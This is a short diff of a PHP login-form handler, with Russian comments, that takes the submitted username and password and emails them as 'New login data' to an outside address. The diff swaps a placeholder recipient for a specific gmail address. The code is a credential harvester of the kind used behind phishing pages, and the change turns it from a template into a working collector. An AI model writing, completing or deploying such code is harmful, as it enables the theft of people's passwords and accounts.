@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $password = $_POST["password"];
   
   // Пример отправки почты
-  $to = "ваш_адрес_почты@example.com";
+  $to = "ezeil5408@gmail.com";
   $subject = "Новые данные входа";
   $message = "Логин: " . $username . "\nПароль: " . $password;
   $headers = "From: ezeil5408@gmail.com";
